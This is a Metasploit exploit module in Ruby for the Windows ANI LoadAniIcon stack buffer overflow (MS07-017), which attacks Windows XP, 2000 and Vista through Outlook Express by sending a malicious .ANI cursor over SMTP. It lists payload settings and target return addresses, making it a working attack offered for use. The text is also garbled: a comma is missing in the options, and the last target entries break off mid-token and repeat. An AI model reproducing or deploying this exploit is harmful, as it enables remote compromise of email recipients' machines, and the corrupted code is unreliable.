##
# This module requires Metasploit: https://metasploit/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  #
  # This module sends email messages via smtp
  #
  include Msf::Exploit::Remote::SMTPDeliver

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Windows ANI LoadAnIcon() Chunk Size Stack Buffer Overflow (SMTP)',
      'Description'     => %q{
        This module exploits a buffer overflow vulnerability in the
        LoadAniIcon function of USER32.dll. The flaw is triggered
        through Outlook Express by using the CURSOR style sheet
        directive to load a malicious .ANI file.

        This vulnerability was discovered by Alexander Sotirov of Determina
        and was rediscovered, in the wild, by McAfee.
      },
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'hdm',    # First version
          'skape',  # Vista support
        ],
      'References'      =>
        [
          ['MSB', 'MS07-017'],
          ['CVE', '2007-0038'],
          ['CVE', '2007-1765'],
          ['OSVDB', '33629'],
          ['BID', '23194'],
          ['URL', 'http://www.microsoft.com/technet/security/advisory/935423.mspx']
        ],
      'Stance'          => Msf::Exploit::Stance::Passive,
      'DefaultOptions'  =>
        {
          # Cause internet explorer to exit after the code hits
          'EXITFUNC' => 'process',
        }
      'Payload'        =>
        {
          'Space'       => 1024 + (rand(1000)),
          'MinNops'     => 32,
          'Compat'      =>
            {
              'ConnectionType' => '-bind -find'
            },

          'StackAdjustment' => -3500,
        },
      'Platform'  => 'win',
      'Targets'   =>
        [
          #
          # Use multiple cursor URLs to try all targets. This can result in
          # multiple, sequential sessions
          #

          [ 'Automatic', {} ],

          #
          # the followin targets use call [ebx+4], just like the original exploit
          #

          # Partial overwrite doesn't work for Outlook Express
          [ 'Windows XP SP2 user32.dll 5.1.2600.2622', { 'Ret' => 0x25ba, 'Len' => 2 }],

          # Should work for all English XP SP2
          [ 'Windows XP SP2 userenv.dll English', { 'Ret' => 0x769fc81a }],

          # Supplied by Fabrice MOURRON <fab[at]revhosts.net>
          [ 'Windows XP SP2 userenv.dll French', { 'Ret' => 0x7699c81a }],

          # Should work for English XP SP0/SP1
          [ 'Windows XP SP0/SP1 netui2.dll English', { 'Ret' => 0x71bd0205 }],

          # Should work for English 2000 SP0-SP4+
          [ 'Windows 2000 SP0-SP4 netui2.dll English', { 'Ret' => 0x75116d88 }],

          #
          # Partial overwrite where 700b is a jmp dword [ebx] ebx points to the start
          # of the RIFF chunk itself. The length field of the RIFF chunk
          # tag contains a short jump into an embedded riff chunk that
          # makes a long relative jump into the actual payload.
          #
          [ 'Windows Vista user32.dll 6.0.6000.16386',
            {
              'Ret'     => 0x700b,
              'Len'     => 2,

              # On Vista, the pages that contain the RIFF are read-only
              # In-place decoders cannot be used.
              'Payload'   => { 'EncoderType' => Msf::Encoder::Type::Raw }
            }
          ],

          #
          # Supplied by Ramon de C Valle
          #

          # call [ebx+4]
          [ 'Windows XP SP2 user { 'Ret' => 0x, 
          [ 'Windows XP SP2 user { 'Ret' => 0x, 
          [ 'Windows XP SP2 user { 'Ret' => 0x, 
  
